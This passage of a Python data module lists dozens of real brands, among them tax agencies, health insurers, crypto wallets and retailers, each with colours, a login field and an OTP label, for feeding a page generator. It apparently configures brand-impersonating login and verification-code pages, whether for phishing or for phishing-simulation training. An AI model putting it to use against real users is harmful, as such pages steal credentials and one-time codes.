        ("daum",                "Daum",                        "#1b6ca8", "#1b1b1b", "email", "verification code"),
        ("qqmail",              "QQ Mail",                     "#12b7f5", "#1b1b1b", "email", "verification code"),
        ("163mail",             "NetEase Mail",                "#d0021b", "#1b1b1b", "email", "verification code"),
        ("grammarly",           "Grammarly",                   "#15c39a", "#1b1b1b", "email", "verification code"),
        ("evernote",            "Evernote",                    "#00a82d", "#1b1b1b", "email", "verification code"),
        ("todoist",             "Todoist",                     "#e44332", "#1b1b1b", "email", "verification code"),
        ("toggl",               "Toggl",                       "#e57cd8", "#1b1b1b", "email", "verification code"),
    ],

    # ---- cloud, dev & infra ------------------------------------------------
    "cloud_more": [
        ("planetscale",         "PlanetScale",                 "#1b1b1b", "#1b1b1b", "email", "verification code"),
        ("travisci",            "Travis CI",                   "#3eaaaf", "#1b1b1b", "email", "verification code"),
        ("porkbun",             "Porkbun",                     "#ef5533", "#1b1b1b", "email", "verification code"),
        ("dnsimple",            "DNSimple",                    "#1b1b1b", "#1b1b1b", "email", "verification code"),
        ("unity3d",             "Unity",                       "#1b1b1b", "#1b1b1b", "email", "verification code"),
    ],

    # ---- social, media & streaming -----------------------------------------
    "social_more": [
        ("flickr",              "Flickr",                      "#0063dc", "#1b1b1b", "email", "verification code"),
        ("weibo",               "Weibo",                       "#e6162d", "#1b1b1b", "phone", "verification code"),
        ("kakaotalk",           "KakaoTalk",                   "#ffcd00", "#1b1b1b", "phone", "verification code"),
        ("elementchat",         "Element",                     "#0dbd8b", "#1b1b1b", "email", "verification code"),
        ("mastodon",            "Mastodon",                    "#6364ff", "#1b1b1b", "email", "verification code"),
        ("bluesky",             "Bluesky",                     "#0285ff", "#1b1b1b", "email", "verification code"),
        ("threads",             "Threads",                     "#1b1b1b", "#1b1b1b", "username", "verification code"),
        ("clubhouse",           "Clubhouse",                   "#f0e7d8", "#1b1b1b", "phone", "verification code"),
        ("meetup",              "Meetup",                      "#ed1c40", "#1b1b1b", "email", "verification code"),
        ("pandora",             "Pandora",                     "#3668ff", "#1b1b1b", "email", "verification code"),
        ("dailymotion",         "Dailymotion",                 "#0066dc", "#1b1b1b", "email", "verification code"),
    ],

    # ---- e-commerce, delivery & travel -------------------------------------
    "commerce_more": [
        ("kroger",              "Kroger",                      "#003da5", "#1b1b1b", "email", "verification code"),
        ("walgreens",           "Walgreens",                   "#e31837", "#1b1b1b", "email", "verification code"),
        ("cvs",                 "CVS",                         "#cc0000", "#1b1b1b", "email", "verification code"),
        ("instacart",           "Instacart",                   "#43b02a", "#1b1b1b", "email", "verification code"),
        ("doordash",            "DoorDash",                    "#ff3008", "#1b1b1b", "email", "verification code"),
        ("ubereats",            "Uber Eats",                   "#06c167", "#1b1b1b", "email", "verification code"),
        ("grubhub",             "Grubhub",                     "#f63440", "#1b1b1b", "email", "verification code"),
        ("deliveroo",           "Deliveroo",                   "#00ccbc", "#1b1b1b", "email", "verification code"),
        ("justeat",             "Just Eat",                    "#ff8000", "#1b1b1b", "email", "verification code"),
        ("tokopedia",           "Tokopedia",                   "#03ac0e", "#1b1b1b", "email", "verification code"),
        ("allegro",             "Allegro",                     "#ff5a00", "#1b1b1b", "email", "verification code"),
        ("otto",                "OTTO",                        "#e2001a", "#1b1b1b", "email", "verification code"),
        ("bol",                 "bol.com",                     "#0000a4", "#1b1b1b", "email", "verification code"),
        ("argos",               "Argos",                       "#da291c", "#1b1b1b", "email", "verification code"),
        ("currys",              "Currys",                      "#4b1f8f", "#1b1b1b", "email", "verification code"),
        ("johnlewis",           "John Lewis",                  "#1b1b1b", "#1b1b1b", "email", "verification code"),
        ("marksandspencer",     "M&S",                         "#1b1b1b", "#1b1b1b", "email", "verification code"),
        ("southwestair",        "Southwest",                   "#304cb2", "#f9b612", "email", "verification code"),
        ("hotelscom",           "Hotels.com",                  "#c8102e", "#1b1b1b", "email", "verification code"),
    ],

    # ---- telecom & VPN -----------------------------------------------------
    "telecom_more": [
        ("spectrum",            "Spectrum",                    "#0091db", "#1b1b1b", "username", "OTP"),
        ("bellca",              "Bell",                        "#00549f", "#1b1b1b", "phone", "OTP"),
        ("telus",               "TELUS",                       "#4b286d", "#1b1b1b", "phone", "OTP"),
        ("telefonica",          "Telefonica",                  "#019df4", "#1b1b1b", "phone", "OTP"),
        ("swisscom",            "Swisscom",                    "#e60000", "#1b1b1b", "phone", "OTP"),
        ("singtel",             "Singtel",                     "#1b1b1b", "#f5a623", "phone", "OTP"),
        ("vi",                  "Vi",                          "#ed1c24", "#1b1b1b", "phone", "OTP"),
        ("safaricom",           "Safaricom",                   "#3cb44a", "#1b1b1b", "phone", "OTP"),
        ("starlink",            "Starlink",                    "#1b1b1b", "#1b1b1b", "email", "verification code"),
    ],

    # ---- crypto & wallets --------------------------------------------------
    "crypto_more": [
        ("htx",                 "HTX",                         "#1b1b1b", "#1b1b1b", "email", "verification code"),
        ("bitcoincom",          "Bitcoin.com",                 "#f7931a", "#1b1b1b", "email", "verification code"),
        ("exodusapp",           "Exodus",                      "#0b132b", "#1b1b1b", "email", "verification code"),
        ("opensea",             "OpenSea",                     "#2081e2", "#1b1b1b", "email", "verification code"),
        ("rarible",             "Rarible",                     "#feda03", "#1b1b1b", "email", "verification code"),
        ("magiceden",           "Magic Eden",                  "#e42575", "#1b1b1b", "email", "verification code"),
        ("pancakeswap",         "PancakeSwap",                 "#1fc7d4", "#1b1b1b", "email", "verification code"),
        ("uniswap",             "Uniswap",                     "#ff007a", "#1b1b1b", "email", "verification code"),
    ],

    # ---- gaming ------------------------------------------------------------
    "gaming_more": [
        ("humble",              "Humble Bundle",               "#cc2929", "#1b1b1b", "email", "verification code"),
        ("itchio",              "itch.io",                     "#fa5c5c", "#1b1b1b", "email", "verification code"),
        ("g2a",                 "G2A",                         "#ff5500", "#1b1b1b", "email", "verification code"),
        ("kinguin",             "Kinguin",                     "#1b1b1b", "#f5a623", "email", "verification code"),
        ("wargaming",           "Wargaming",                   "#1b1b1b", "#f5a623", "email", "verification code"),
        ("minecraft",           "Minecraft",                   "#3c8527", "#1b1b1b", "email", "verification code"),
        ("fortnite",            "Fortnite",                    "#1b1b1b", "#00c8ff", "email", "verification code"),
        ("zynga",               "Zynga",                       "#e2231a", "#1b1b1b", "email", "verification code"),
    ],

    # ---- government & public services --------------------------------------
    "government_more": [
        ("uscis",               "USCIS",                       "#005ea2", "#1b1b1b", "username", "verification code"),
        ("canadarevenue",       "Canada Revenue Agency",       "#26374a", "#1b1b1b", "username", "verification code"),
        ("atoau",               "Australian Taxation Office",  "#004c8c", "#1b1b1b", "username", "verification code"),
        ("irdnz",               "Inland Revenue NZ",           "#004b8d", "#1b1b1b", "username", "verification code"),
        ("incometaxin",         "Income Tax India",            "#1b4d8c", "#ff9933", "username", "OTP"),
        ("singpass",            "Singpass",                    "#d0021b", "#1b1b1b", "username", "OTP"),
        ("govhk",               "GovHK",                       "#00a0e9", "#1b1b1b", "username", "verification code"),
    ],

    # ---- healthcare & education --------------------------------------------
    "health_edu": [
        ("mychart",             "MyChart",                     "#1b4d8c", "#1b1b1b", "username", "verification code"),
        ("kaiser",              "Kaiser Permanente",           "#0076a8", "#1b1b1b", "username", "verification code"),
        ("nhs",                 "NHS",                         "#005eb8", "#1b1b1b", "email", "verification code"),
        ("anthem",              "Anthem",                      "#0066b3", "#1b1b1b", "username", "verification code"),
        ("aetna",               "Aetna",                       "#7f3f98", "#1b1b1b", "username", "verification code"),
        ("cigna",               "Cigna",                       "#00a0df", "#1b1b1b", "username", "verification code"),
        ("unitedhealth",        "UnitedHealthcare",            "#002677", "#1b1b1b", "username", "verification code"),
        ("khanacademy",         "Khan Academy",                "#14bf96", "#1b1b1b", "email", "verification code"),
        ("duolingo",            "Duolingo",                    "#58cc02", "#1b1b1b", "email", "verification code"),
        ("toppr",               "Toppr",                       "#3f51b5", "#1b1b1b", "phone", "OTP"),
        ("nptel",               "NPTEL",                       "#1b4d8c", "#1b1b1b", "email", "verification code"),
        ("swayam",              "SWAYAM",                      "#0072bc", "#1b1b1b", "email", "verification code"),
        ("skillshare",          "Skillshare",                  "#00ff84", "#1b1b1b", "email", "verification code"),
        ("pluralsight",         "Pluralsight",                 "#f15b2a", "#1b1b1b", "email", "verification code"),
        ("masterclass",         "MasterClass",                 "#e2231a", "#1b1b1b", "email", "verification code"),
        ("brilliant",           "Brilliant",                   "#1b6ca8", "#1b1b1b", "email", "verification code"),
    ],

}

# Flat list in the generator's exact tuple shape - feed straight into
# gen_templates.build_site(*entry) or append to gen_templates.SITES.
BRANDS = [entry for _group in CATEGORIES.values() for entry in _group]

# slug -> category, for reporting / generating a single vertical.
CATEGORY_OF = {entry[0]: _cat for _cat, _group in CATEGORIES.items() for entry in _group}

# Field order of the generator tuple, exposed so callers/tests don't hardcode it.
REQUIRED_FIELDS = ("slug", "name", "brand", "accent", "login_with", "otp_label")

# Identifier fields the generator understands (mirrors gen_templates.VALID_LOGIN_WITH).
VALID_LOGIN_WITH = ("email", "username", "phone", "email_or_phone")
